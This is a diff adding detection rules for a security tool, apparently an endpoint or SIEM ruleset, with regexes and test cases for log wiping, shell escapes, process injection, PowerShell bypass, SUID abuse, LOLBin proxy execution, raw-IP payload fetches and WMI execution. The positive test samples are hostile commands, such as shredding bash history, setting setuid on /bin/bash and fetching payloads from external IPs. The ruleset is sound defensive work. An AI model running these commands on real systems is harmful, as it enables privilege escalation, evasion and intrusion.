+    - {event: {command_line: 'rundll32 vbscript:"\..\mshtml,#135 "+String(CreateObject("WScript.Shell").Run("calc.exe"),0)'}, expect_match: true}
+    - {event: {command_line: 'C:\Windows\System32\diskshadow.exe -S C:\x\T1218.txt'}, expect_match: true}
+    - {event: {command_line: 'Gpscript /startup'}, expect_match: true}
+    - {name: opening the Network control panel applet, event: {command_line: 'rundll32.exe shell32.dll,Control_RunDLL ncpa.cpl'}, expect_match: false}
+    - {name: printer UI, event: {command_line: 'rundll32 printui.dll,PrintUIEntry /il'}, expect_match: false}
+    - {name: normal regsvr32 of a vendor control, event: {command_line: 'regsvr32 /s "C:\Program Files\Vendor\ctl.ocx"'}, expect_match: false}
+
+- id: TB-EVADE-015
+  name: Anti-forensic deletion of logs, history, prefetch or remote-tool artefacts
+  severity: medium
+  confidence: 65
+  techniques: [T1070.004, T1070.003, T1070]
+  tags: [defense-evasion, anti-forensics]
+  tuning: Log rotation tools delete old logs; exclude their process names.
+  match:
+    any:
+      - {field: command_line, regex: '(\bdel\b|\berase\b|remove-item|\brm\b|\bshred\b|\bsdelete(64)?\b|\bwipe\b|\bsrm\b).{0,120}(\\prefetch\\|\\winevt\\logs\\|\.evtx|\\recent\\|automaticdestinations|\\teamviewer\\|\\anydesk\\|\\connectwise|/var/log/(auth|secure|syslog|messages|wtmp|btmp|lastlog|audit)|\.(bash|zsh|python)_history|\.viminfo|\.lesshst)'}
+      - {field: command_line, regex: '\bcipher(\.exe)?\s+/w:|\bsdelete(64)?(\.exe)?\s+-[a-z]*[psrz]|\bshred\s+(-\w{1,6}\s+){0,4}-[a-z]{0,4}[zun]'}
+      - {field: command_line, regex: 'fsutil(\.exe)?\s+usn\s+deletejournal|vssadmin(\.exe)?\s+delete\s+shadows|wevtutil(\.exe)?\s+epl\b.{0,80}&&.{0,20}wevtutil'}
+  tests:
+    - {event: {command_line: 'Remove-Item -Path (Join-Path "$Env:SystemRoot\prefetch\" (Get-ChildItem -Path "$Env:SystemRoot\prefetch\*.pf" -Name)[0])'}, expect_match: true}
+    - {event: {command_line: 'sdelete -p 3 C:\Users\bob\secret.docx'}, expect_match: true}
+    - {event: {command_line: 'fsutil usn deletejournal /d C:'}, expect_match: true}
+    - {event: {command_line: 'shred -u ~/.bash_history'}, expect_match: true}
+    - {name: deleting a temp file, event: {command_line: 'del /f %temp%\build.tmp'}, expect_match: false}
+    - {name: removing a build directory, event: {command_line: 'rm -rf ./build'}, expect_match: false}
+
+- id: TB-EXEC-012
+  name: Shell spawned from an editor, pager or multiplexer escape, or busybox applet shell
+  severity: medium
+  confidence: 65
+  techniques: [T1059.004, T1548.003]
+  tags: [execution, shell-escape, gtfobins]
+  match:
+    any:
+      - {field: command_line, regex: '(sudo\s+)?(emacs|vim?|nano|less|more|man|awk|gawk|find|nmap|git|ftp|gdb|zip|tar|rsync|socat|script|expect|ed|ex)\s.{0,100}(\(term\s+"/bin/(ba)?sh|--eval\s+.{0,20}term|-c\s+:!?\s?sh|!(/bin/)?(ba)?sh\b|-exec\s+/bin/(ba)?sh|--checkpoint-action=exec=\S{0,20}sh|-e\s+"?(ba)?sh|system\("/bin/(ba)?sh)'}
+      - {field: command_line, regex: '^\s*busybox\s+(ba)?sh\b'}
+  tests:
+    - {event: {command_line: "sudo emacs -Q -nw --eval '(term \"/bin/sh &\")'"}, expect_match: true}
+    - {event: {command_line: 'busybox sh &'}, expect_match: true}
+    - {event: {command_line: 'find / -perm -4000 -exec /bin/sh -p \;'}, expect_match: true}
+    - {event: {command_line: 'less /var/log/syslog'}, expect_match: false}
+    - {event: {command_line: 'find /var/log -name "*.gz" -mtime +30 -delete'}, expect_match: false}
+
+- id: TB-EXEC-013
+  name: cmd.exe environment-variable substring obfuscation
+  severity: medium
+  confidence: 65
+  techniques: [T1027.010, T1059.003]
+  tags: [obfuscation, cmd]
+  match:
+    any:
+      - {field: command_line, regex: '%[a-z_]{3,20}:~-?\d{1,3}(,-?\d{1,3})?%\S{0,3}\s{0,3}/[a-z]\b'}
+      - {field: command_line, regex: '(%[a-z_]{3,20}:~-?\d{1,3},-?\d{1,3}%){2,6}'}
+      - {field: command_line, regex: '(set\s{1,3}\w{1,6}=\S{1,20}&){3,8}'}
+  tests:
+    - {event: {command_line: '%LOCALAPPDATA:~-3,1%md /c echo hello > hello.txt & type hello.txt'}, expect_match: true}
+    - {event: {command_line: 'cmd /c %COMSPEC:~0,1%%COMSPEC:~4,1%%COMSPEC:~-1,1% /c whoami'}, expect_match: true}
+    - {name: ordinary variables, event: {command_line: 'cmd /c echo %USERPROFILE% & dir %TEMP%'}, expect_match: false}
+
+- id: TB-EXEC-014
+  name: Process-injection API sequence in a script or command line
+  severity: high
+  confidence: 75
+  techniques: [T1055, T1055.001, T1055.012]
+  tags: [injection, defense-evasion]
+  match:
+    any:
+      - {field: command_line, regex: '(virtualallocex|ntallocatevirtualmemory).{0,200}(writeprocessmemory|ntwritevirtualmemory).{0,200}(createremotethread|ntcreatethreadex|queueuserapc|rtlcreateuserthread|setthreadcontext)'}
+      - {field: command_line, regex: 'add-type\s.{0,200}(writeprocessmemory|createremotethread|ntmapviewofsection|queueuserapc|rtlcreateuserthread)'}
+      - {field: command_line, regex: 'dllimport\(\s*["'']kernel32(\.dll)?["''].{0,400}(virtualalloc|virtualprotect|createthread|writeprocessmemory)'}
+      - {field: command_line, regex: '\b(mavinject|invoke-dllinjection|invoke-reflectivepeinjection|invoke-processhollow|invoke-thread|processhollowing|shellcodeinject\w{0,10}|sharpinject\w{0,10})\b'}
+  tests:
+    - {event: {command_line: 'powershell -c "Add-Type -MemberDefinition $sig -Name Win32 -Namespace N; [N.Win32]::VirtualAllocEx(...); WriteProcessMemory(...); CreateRemoteThread(...)"'}, expect_match: true}
+    - {event: {command_line: 'powershell -c "Add-Type -TypeDefinition $csharp; [Native]::CreateRemoteThread($h)"'}, expect_match: true}
+    - {event: {command_line: 'Invoke-DllInjection -ProcessID 1234 -Dll evil.dll'}, expect_match: true}
+    - {name: ordinary Add-Type, event: {command_line: 'powershell -c "Add-Type -AssemblyName System.Windows.Forms"'}, expect_match: false}
+
+- id: TB-EXEC-015
+  name: PowerShell started with policy bypass and a hidden or inline command
+  severity: medium
+  confidence: 60
+  techniques: [T1059.001, T1562.001]
+  tags: [powershell, policy-bypass]
+  tuning: CI systems and configuration management use -ExecutionPolicy Bypass with -File; those are excluded. Inline/hidden launches are the signal.
+  match:
+    all:
+      - {field: command_line, regex: 'powershell(\.exe)?\s.{0,200}-(ep|exec|executionpolicy)\s+bypass'}
+      - any:
+          - {field: command_line, regex: '-(w|window|windowstyle)\s+hidden'}
+          - {field: command_line, regex: '-(c|command)\s+["'']?(&|\$|iex|\(|\[)'}
+          - {field: command_line, regex: '-(nop|noprofile)\s.{0,60}-(c|command)\s+["'']?\S'}
+      - not: {field: command_line, regex: '-(f|file)\s+["'']?\S{1,200}\.ps1'}
+  tests:
+    - {event: {command_line: 'powershell -ExecutionPolicy Bypass -W Hidden -c "Get-Process"'}, expect_match: true}
+    - {event: {command_line: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument)"'}, expect_match: false}
+    - {name: CI build script by file, event: {command_line: 'powershell -NoProfile -ExecutionPolicy Bypass -File C:\build\run.ps1'}, expect_match: false}
+    - {name: inline command with bypass, event: {command_line: 'powershell -nop -ep bypass -c "& { iwr 198.51.100.4/a }"'}, expect_match: true}
+
+- id: TB-PRIV-008
+  name: SUID/SGID enumeration or setuid bit applied to a shell or interpreter
+  severity: medium
+  confidence: 60
+  techniques: [T1548.001]
+  tags: [privilege-escalation, suid, linux]
+  match:
+    any:
+      - {field: command_line, regex: '\bfind\s+/\S{0,20}\s.{0,40}-perm\s+(-?(u=s|g=s|4000|2000|6000)|/(u=s|4000|6000))'}
+      - {field: command_line, regex: '\bchmod\s+(u\+s|g\+s|\+s|[2467][0-7]{3})\s+\S{0,60}(bash|sh|zsh|dash|python\w{0,4}|perl|ruby|vim|find|cp|nmap|env)\b'}
+  tests:
+    - {event: {command_line: 'find /usr/bin -perm -4000'}, expect_match: true}
+    - {event: {command_line: 'chmod u+s /bin/bash'}, expect_match: true}
+    - {event: {command_line: 'chmod 755 /usr/local/bin/deploy.sh'}, expect_match: false}
+    - {event: {command_line: 'find /var/log -name "*.gz" -mtime +30'}, expect_match: false}
+
+- id: TB-EXEC-016
+  name: Signed system binary pointed at a payload in a user-writable staging directory (proxy execution)
+  severity: high
+  confidence: 70
+  techniques: [T1218, T1127, T1202]
+  tags: [lolbin, proxy-execution, staging]
+  tuning: Developer machines legitimately run dotnet/msbuild/csc on files under Downloads; exclude by account or by repository path.
+  match:
+    all:
+      - {field: command_line, regex: '(^|[\\/\s"''])(atbroker|bash|bginfo|cdb|cmstp|csc|jsc|ilasm|vbc|dotnet|dxcap|devtoolslauncher|diantz|extrac32|expand|esentutl|hh|ieexec|infdefaultinstall|installutil|mavinject|msbuild|msdeploy|msxsl|netsh|odbcconf|pcalua|regasm|regsvcs|regsvr32|replace|rundll32|runexehelper|runscripthelper|scriptrunner|sqltoolsps|squirrel|te|tracker|tttracer|vsjitdebugger|wab|wlrmdr|wuauclt|wmic|xwizard|mshta|microsoft\.workflow\.compiler|ftp|findstr|makecab|mpcmdrun|certreq|presentationhost|rcsi|csi|wsl|sc|reg|schtasks)(\.exe)?("|'')?\s'}
+      - {field: command_line, regex: '(\\users\\public\\|\\windows\\temp\\|\\appdata\\(local\\temp|roaming|local)\\|\\programdata\\|\\users\\\S{1,30}\\(downloads|desktop|documents)\\|%temp%|%tmp%|%appdata%|%localappdata%|%public%|\\perflogs\\|\\\$recycle\.bin\\)\S{0,100}\.(exe|dll|bat|cmd|ps1|vbs|vbe|js|jse|hta|sct|wsc|xml|xsl|inf|bgi|cab|ocx|cpl|scr|lnk|wds|cs|vb|csproj|dat|bin|cmd)\b'}
+      - not: {field: command_line, regex: '(^|[\\/\s"''])(sc|reg|schtasks|netsh|wmic|findstr)(\.exe)?("|'')?\s+(query|show|list|/query|get|help|/\?)\b'}
+  tests:
+    - {event: {command_line: 'runexehelper.exe C:\Users\Public\payload.exe'}, expect_match: true}
+    - {event: {command_line: 'wuauclt.exe /UpdateDeploymentProvider C:\Users\Public\payload.dll /RunHandlerComServer'}, expect_match: true}
+    - {event: {command_line: 'bginfo.exe C:\Users\Public\payload.bgi /popup /nolicprompt'}, expect_match: true}
+    - {event: {command_line: 'csc.exe -out:C:\Users\Public\payload.exe C:\Users\Public\payload.cs'}, expect_match: true}
+    - {name: build of a project outside staging, event: {command_line: 'msbuild C:\src\app\app.csproj /p:Configuration=Release'}, expect_match: false}
+    - {name: vendor control registered from Program Files, event: {command_line: 'regsvr32 /s "C:\Program Files\Vendor\ctl.ocx"'}, expect_match: false}
+    - {name: querying a service, event: {command_line: 'sc query spooler'}, expect_match: false}
+    - {name: a script run by name, event: {command_line: 'dotnet build C:\src\app.sln'}, expect_match: false}
+
+- id: TB-EXEC-017
+  name: Command line fetches from, or executes on, a raw external IP address (URL or SMB path)
+  severity: medium
+  confidence: 60
+  techniques: [T1105, T1204, T1218]
+  tags: [ingress-tool-transfer, raw-ip]
+  tuning: Health checks and scripts that address external IPs directly are rare; allowlist the monitoring hosts that do.
+  match:
+    any:
+      - {field: command_line, regex: '\b(https?|ftps?|tftp)://(?!(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|127\.|169\.254\.|0\.0\.0\.0))(\d{1,3}\.){3}\d{1,3}(:\d{2,5})?(/|\b)'}
+      - {field: command_line, regex: '(^|[\s"''=,(])\\\\(?!(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|127\.|169\.254\.))(\d{1,3}\.){3}\d{1,3}\\'}
+      - {field: command_line, regex: '/z(https?|ftps?)://(?!(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.))\S{1,100}'}
+  tests:
+    - {event: {command_line: 'HH.exe http://198.51.100.50/payload.bat'}, expect_match: true}
+    - {event: {command_line: 'extrac32 /Y /C \\198.51.100.50\share\payload C:\Users\Public\payload'}, expect_match: true}
+    - {event: {command_line: 'Update.exe --update=http://198.51.100.50/payload'}, expect_match: true}
+    - {name: internal server, event: {command_line: 'curl http://10.0.4.9:8080/health'}, expect_match: false}
+    - {name: named external host, event: {command_line: 'curl https://api.vendor.example/health'}, expect_match: false}
+    - {name: loopback, event: {command_line: 'curl http://127.0.0.1:9200/_cluster/health'}, expect_match: false}
+
+- id: TB-EXEC-018
+  name: WMI process creation of an interpreter, signed-binary proxy or staged payload; data-file copy through WMI
+  severity: high
+  confidence: 70
+  techniques: [T1047]
+  tags: [wmi, execution]
+  match:
+    any:
+      - {field: command_line, regex: 'wmic(\.exe)?\s.{0,80}process\s+call\s+create\s+("|'')?\\?"?(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin|msiexec|\S{0,60}\\(temp|users\\public|appdata|programdata)\\)'}
+      - {field: command_line, regex: 'wmic(\.exe)?\s+datafile\s.{0,160}call\s+(copy|rename|delete)'}
+      - {field: command_line, regex: 'netsh(\.exe)?\s+add\s+helper\s+\S{1,200}\.dll'}
+  tests:
+    - {event: {command_line: 'wmic.exe process call create "cmd.exe /c whoami"'}, expect_match: true}
+    - {event: {command_line: 'wmic.exe datafile where "Name=''C:\\windows\\system32\\calc.exe''" call Copy "C:\\users\\public\\calc.exe"'}, expect_match: true}
+    - {event: {command_line: 'netsh.exe add helper C:\Users\Public\payload.dll'}, expect_match: true}
+    - {name: administrator starts notepad, event: {command_line: 'wmic process call create "notepad.exe"'}, expect_match: false}
+    - {name: inventory query, event: {command_line: 'wmic os get caption'}, expect_match: false}
